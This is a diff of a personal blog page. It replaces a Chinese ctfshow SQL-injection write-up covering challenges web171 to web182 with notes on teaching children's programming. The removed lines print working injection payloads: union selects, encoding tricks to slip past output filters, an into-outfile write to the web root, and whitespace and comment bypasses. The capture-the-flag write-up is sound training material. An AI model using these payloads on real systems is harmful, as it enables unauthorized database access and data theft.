@@ -14,11 +14,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="ctfshow-sql题记">
+  <meta name="description" content="近期的少儿编程所得">
   <meta name="author" content="OPN">
   <meta name="keywords" content="">
   
-  <title>ctfshow-sql - OPN&#39;S BLOG</title>
+  <title>少儿编程所得 - OPN&#39;S BLOG</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="ctfshow-sql">
+            <span class="h2" id="subtitle" title="少儿编程所得">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-07-18 14:21" pubdate>
-        2021年7月18日 下午
+      <time datetime="2023-06-30 20:38" pubdate>
+        2023年6月30日 晚上
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      954 字
+      723 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      14
+      7
        分钟
     </span>
   
@@ -233,136 +233,130 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">ctfshow-sql</h1>
+            <h1 style="display: none">少儿编程所得</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：2 年前
+                  本文最后更新于：几秒前
                 
               </p>
             
             <div class="markdown-body">
-              <p>ctfshow-sql题记</p>
+              <p>近期的少儿编程所得</p>
 <span id="more"></span>
 
-<h1 id="web171-web175-无过滤注入"><a href="#web171-web175-无过滤注入" class="headerlink" title="web171-web175 无过滤注入"></a>web171-web175 无过滤注入</h1><h2 id="web171-‘-23’-‘–-’"><a href="#web171-‘-23’-‘–-’" class="headerlink" title="web171  ‘%23’ + ‘–+’"></a>web171  ‘%23’ + ‘–+’</h2><p><img src="/2021/07/18/ctfshow-sql/1.png" srcset="/img/loading.gif" lazyload>  </p>
-<p>SQL注释符 : url(%23) === # === –+</p>
-<p>payload:  </p>
-<div class="hljs code-wrapper"><pre><code>1′ or 1=1%23
+
+<h2 id="少儿编程"><a href="#少儿编程" class="headerlink" title="少儿编程"></a>少儿编程</h2><p>（2023.5.20——2023.6.30）</p>
+<p>少儿编程总结</p>
+<p>备课  </p>
+<p>授课</p>
+<p>复习——导入——授课/讲述知识——实际操作——总结  </p>
+<p>纪律，风格</p>
+<p>课后，与家长沟通</p>
+<p>反思，总结</p>
+<h3 id="备课"><a href="#备课" class="headerlink" title="备课"></a>备课</h3><div class="hljs code-wrapper"><pre><code>准备充足，思路明确
+
+写好教案（重要时可以写出每一句话要怎么讲）
+
+确定本次课的重点、难点、学习目标
+
+ppt衔接
+
+课前准备（ppt、教案、学生材料、粉笔、板擦 ......）
 </code></pre></div>
-<h2 id="web172-to-base64-hex"><a href="#web172-to-base64-hex" class="headerlink" title="web172  to_base64()/hex()"></a>web172  to_base64()/hex()</h2><p><img src="/2021/07/18/ctfshow-sql/2.png" srcset="/img/loading.gif" lazyload>    </p>
-<p>对结果进行了过滤，查询出的数据中不能包含flag，给出了数据库ctfshow_user2<br>flag头为ctfshow{xxx}，不包含’flag’ ……</p>
-<p>可用to_base64()/hex()直接在输出时进行编码，绕过输出时特殊字符的过滤</p>
-<p>payload:  </p>
-<div class="hljs code-wrapper"><pre><code>1&#39;union select 1,2 %23
-//确定注入点
-1&#39;union select 1,password from ctfshow_user2 %23  
-//get flag  
-1&#39;union select 1,to_base64(password) from ctfshow_user2 where username=&#39;flag&#39; %23
-//利用to_base64()进行特殊字符的绕过
+<h3 id="授课"><a href="#授课" class="headerlink" title="授课"></a>授课</h3><h4 id="复习"><a href="#复习" class="headerlink" title="复习"></a>复习</h4><div class="hljs code-wrapper"><pre><code>提到、应用旧知识
 </code></pre></div>
-<h2 id="web173-json数据"><a href="#web173-json数据" class="headerlink" title="web173  json数据"></a>web173  json数据</h2><p><img src="/2021/07/18/ctfshow-sql/3.png" srcset="/img/loading.gif" lazyload><br>json数据类型  </p>
-<p><img src="/2021/07/18/ctfshow-sql/5.png" srcset="/img/loading.gif" lazyload>   </p>
-<p>函数json_encode()和json_decode()  </p>
-<p><img src="/2021/07/18/ctfshow-sql/6.png" srcset="/img/loading.gif" lazyload><br>payload:  </p>
-<div class="hljs code-wrapper"><pre><code>1&#39;union select 1,2,3%23
-//确定注入点  
-1&#39;union select 1,2,password from ctfshow_user3%23
-//get flag 
+<h4 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h4><div class="hljs code-wrapper"><pre><code>问题导入教学
+
+先提出问题，在学生实际操作感觉到困难与不便，再导入新的知识，新的方法
+
+先产生需求，再给出解决方法
+
+亦可以
+
+自己做错误示范
 </code></pre></div>
-<h2 id="web174-hex-replace"><a href="#web174-hex-replace" class="headerlink" title="web174  hex()/replace()"></a>web174  hex()/replace()</h2><p>避坑：第一次点击进入的是web173的网页……我是傻逼</p>
-<p>数据库：ctfshow_user4   </p>
-<p><img src="/2021/07/18/ctfshow-sql/9.png" srcset="/img/loading.gif" lazyload>  </p>
-<p>返回数据，ban了flag和0-9</p>
-<p>用的是替换的思路，将数字转换为其他字符，但分不清该字符是原字符还是替换后字符，<br>为避免该问题，用hex()函数将flag转为16进制，然后将0-9替换为q-z输出，<br>hex()返回值仅包含0-9和大写A-F，可解决上述问题。</p>
-<p>payload:  </p>
-<div class="hljs code-wrapper"><pre><code>1&#39;union select &#39;a&#39;,&#39;b&#39;%23
-//确定注入点
-1&#39; union select &#39;a&#39;,(select replace(replace (replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#39;1&#39;,&#39;q&#39;),&#39;2&#39;,&#39;r&#39;),&#39;3&#39;,&#39;s&#39;),&#39;4&#39;,&#39;t&#39;),&#39;5&#39;,&#39;u&#39;),&#39;6&#39;,&#39;v&#39;),&#39;7&#39;,&#39;w&#39;),&#39;8&#39;,&#39;x&#39;),&#39;9&#39;,&#39;y&#39;),&#39;0&#39;,&#39;z&#39;) from ctfshow_user4 where username=&#39;flag&#39;)–+
-//sql语句 get flag 
+<h4 id="具体授课"><a href="#具体授课" class="headerlink" title="具体授课"></a>具体授课</h4><h5 id="行为方面"><a href="#行为方面" class="headerlink" title="行为方面"></a>行为方面</h5><div class="hljs code-wrapper"><pre><code>尽量脱稿
+
+不要背台，要有眼神交流
+
+写板书
+
+讲自然语言（对待没有基础的听课者，尽量不讲术语）
+
+留出一定的时间给听课者思考
+
+互动
+
+提出问题
+
+生动、有趣、有代入感？
+
+（声调起伏？）
 </code></pre></div>
-<p>人工处理/脚本处理字符串，get flag</p>
-<p>附python代码截图</p>
-<p><img src="/2021/07/18/ctfshow-sql/10.png" srcset="/img/loading.gif" lazyload>   </p>
-<h2 id="web175-into-outfile写入文件"><a href="#web175-into-outfile写入文件" class="headerlink" title="web175  into outfile写入文件"></a>web175  into outfile写入文件</h2><p>数据库：ctfshow_user5<br><img src="/2021/07/18/ctfshow-sql/11.png" srcset="/img/loading.gif" lazyload>   </p>
-<p>返回数据，ban了所有字符……正常数据都不回显……</p>
-<p>select  into  outfield  功能：<br>导出数据到pc的指定目录下。</p>
-<p>payload:  </p>
-<div class="hljs code-wrapper"><pre><code>1′ union select 1,2%23
-//确定注入点
-1′ union select 1,password from ctfshow_user5 into outfile &#39;/var/www/html/res.txt&#39;%23
-//访问res.txt get flag
+<h5 id="内容方面"><a href="#内容方面" class="headerlink" title="内容方面"></a>内容方面</h5><div class="hljs code-wrapper"><pre><code>要有当节课的着重点，不能讲的太平
+
+着重点——演示、强调、举例
+
+任务步骤拆解、讲解，可写板书
+
+不将简单问题复杂化
+
+对于非本节课内容不能走太远、探讨过深
 </code></pre></div>
-<hr>
-<h1 id="web176-web182-过滤注入"><a href="#web176-web182-过滤注入" class="headerlink" title="web176-web182  过滤注入"></a>web176-web182  过滤注入</h1><p><img src="/2021/07/18/ctfshow-sql/12.png" srcset="/img/loading.gif" lazyload> </p>
-<p><img src="/2021/07/18/ctfshow-sql/13.png" srcset="/img/loading.gif" lazyload> </p>
-<h2 id="web176-大小写"><a href="#web176-大小写" class="headerlink" title="web176  大小写"></a>web176  大小写</h2><div class="hljs code-wrapper"><pre><code>&#39;union select 1,2,3 from ctfshow_user%23
-//判断注入点
-&#39;union Select 1,2,3 from ctfshow_user%23
-//确定注入点
-&#39;union Select 1,2,password from ctfshow_user%23
-//get flag
+<h4 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h4><div class="hljs code-wrapper"><pre><code>按照基础不同
+
+一步一停
+
+要让其自己动手加深理解，对待年纪小，不熟练等情况，要细致，一步一停
+
+留出足够的时间写程序、完成实操
 </code></pre></div>
-<h2 id="web177"><a href="#web177" class="headerlink" title="web177  /**/"></a>web177  /**/</h2><p>ban空格==&gt;可使用/**/</p>
-<p>数据库名，表名，列名可用”包含</p>
-<div class="hljs code-wrapper"><pre><code>1&#39;union/**/select/**/1,2,password/**/from`ctfshow_user`%23
-//get flag
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><div class="hljs code-wrapper"><pre><code>单独一张ppt
+
+演示 + 快速带过
 </code></pre></div>
-<h2 id="web178-09-20"><a href="#web178-09-20" class="headerlink" title="web178  %09 %20"></a>web178  %09 %20</h2><p>ban空格，/**/==&gt;%09<br>%20无用</p>
-<p>ASCII(09)===Tab(水平制表符)<br>ASCII(20)===Space(空格)</p>
-<div class="hljs code-wrapper"><pre><code>&#39;union%09select%091,2,password%09from`ctfshow_user`%23
-//get flag
+<h3 id="互动"><a href="#互动" class="headerlink" title="互动"></a>互动</h3><h4 id="三层提问"><a href="#三层提问" class="headerlink" title="三层提问"></a>三层提问</h4><div class="hljs code-wrapper"><pre><code>讲的什么——怎么理解——引申互动
 </code></pre></div>
-<h2 id="web179-0c-0C"><a href="#web179-0c-0C" class="headerlink" title="web179  %0c/%0C"></a>web179  %0c/%0C</h2><p>空格==&gt;%0c/%0C</p>
-<p>ASCII(0C)===换页键</p>
-<div class="hljs code-wrapper"><pre><code>&#39;union%0cselect%0c1,2,password%0cfrom`ctfshow_user`%23
-//get flag
+<h4 id="表扬"><a href="#表扬" class="headerlink" title="表扬"></a>表扬</h4><div class="hljs code-wrapper"><pre><code>聪明×
+
+实干能力、专注、思考深度、独立思考能力√
 </code></pre></div>
-<h2 id="web-180-‘1’-’1"><a href="#web-180-‘1’-’1" class="headerlink" title="web 180 ‘1’=’1"></a>web 180 ‘1’=’1</h2><p>ban %23==&gt;’1’=’1</p>
-<p>group_concat()拼接字符串</p>
-<div class="hljs code-wrapper"><pre><code>&#39;union%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#39;1&#39;=&#39;1
-//get flag
-id=-1&#39;or(id=26)and&#39;1&#39;=&#39;1
-//Y4tacker师傅的姿势
+<h4 id="互动基础语言"><a href="#互动基础语言" class="headerlink" title="互动基础语言"></a>互动基础语言</h4><div class="hljs code-wrapper"><pre><code>来，我们先来搭建第一部分
+
+我们先给同学们5分钟时间来自己动手做一下这一部分
+
+好，那现在同学们都完成了吗？有没有碰到什么问题呢？
+
+来，我们猜一猜会有什么样的结果
+
+那这个问题的答案是什么呢？
+
+同学们，我们一起来回答一下，对，是......
+
+请一位同学来做一下/尝试一下，谁会呢？举手
+
+谁已经完成了？来这尝试一下其他的操作
 </code></pre></div>
-<h2 id="web181-逻辑-and-gt-or"><a href="#web181-逻辑-and-gt-or" class="headerlink" title="web181  逻辑 and&gt;or"></a>web181  逻辑 and&gt;or</h2><p><img src="/2021/07/18/ctfshow-sql/14.png" srcset="/img/loading.gif" lazyload> </p>
-<p>除了括号，其他可以代替空格的都给过滤了， 而且select还不区分大小写了</p>
-<div class="hljs code-wrapper"><pre><code>可用180中Y4tacker师傅的姿势：
-&#39;or(id=26)and&#39;1&#39;=&#39;1
-放进入sql语句 –&gt;
-&quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &quot;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1; &quot;;
-因为and的优先级大于or，语句相当于
-(username !=&#39;flag&#39; and id =&quot;) or (id=26 and &#39;1&#39;=&#39;1&#39;)
-左边为假，右边是真，所以sql语句相当于
-select id,username,password from ctfshow_user where id=26 and &#39;1&#39;=&#39;1&#39; limit 1 ;    
-利用逻辑关系闭合payload
+<h3 id="发散-拓展思维"><a href="#发散-拓展思维" class="headerlink" title="发散/拓展思维"></a>发散/拓展思维</h3><h3 id="课堂纪律"><a href="#课堂纪律" class="headerlink" title="课堂纪律"></a>课堂纪律</h3><div class="hljs code-wrapper"><pre><code>老师形象和纪律是在第一节课维持起来的
+
+长时间的写/操作 会使学生走神、注意力无法集中（年龄较小的学生）
+
+避免讲太超前的知识
 </code></pre></div>
-<p>学废了学废了  </p>
-<p>借鉴上述原理，构建近似payload：  </p>
-<div class="hljs code-wrapper"><pre><code>&#39;or(`username`=&#39;flag&#39;)and&#39;1&#39;=&#39;1
-&#39;or(`password`like&#39;c%&#39;)and&#39;1&#39;=&#39;1 //flag以c开头
+<h3 id="授课风格"><a href="#授课风格" class="headerlink" title="授课风格"></a>授课风格</h3><h3 id="与家长沟通"><a href="#与家长沟通" class="headerlink" title="与家长沟通"></a>与家长沟通</h3><div class="hljs code-wrapper"><pre><code>您好，是...同学的家长吗？
+我是学校...社团的编程老师，
+来反馈一下孩子近期社团课的学习情况。
 </code></pre></div>
-<h2 id="web182-模糊搜索-like"><a href="#web182-模糊搜索-like" class="headerlink" title="web182  模糊搜索 like"></a>web182  模糊搜索 like</h2><p><img src="/2021/07/18/ctfshow-sql/15.png" srcset="/img/loading.gif" lazyload> </p>
-<p>在181的基础上+ban了flag  </p>
-<div class="hljs code-wrapper"><pre><code>&#39;or(`username`like&#39;f%&#39;)and&#39;1&#39;=&#39;1 
-//模糊搜索
-&#39;or(`password`like&#39;c%&#39;)and&#39;1&#39;=&#39;1 
-//flag以c开头
-</code></pre></div>
-<h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><p>………………………………</p>
+<h2 id="技术相关"><a href="#技术相关" class="headerlink" title="技术相关"></a>技术相关</h2><h3 id="Scratch"><a href="#Scratch" class="headerlink" title="Scratch"></a>Scratch</h3><p>回文数列表</p>
+<h3 id="我的世界编程"><a href="#我的世界编程" class="headerlink" title="我的世界编程"></a>我的世界编程</h3><hr>
+<p>最后感谢下，所有老师的帮助和教诲</p>
 
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/web-ctfshow/">web ctfshow</a>
-                    
-                  </div>
                 
               </div>
               
@@ -377,18 +371,12 @@ select id,username,password from ctfshow_user where id=26 and &#39;1&#39;=&#39;1
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/07/19/BUU-sql/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUU-sql</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/1023/02/16/CodeData/">
-                        <span class="hidden-mobile">Code —— Data</span>
+                      <a href="/2023/03/16/operating/">
+                        <span class="hidden-mobile">运维简学</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
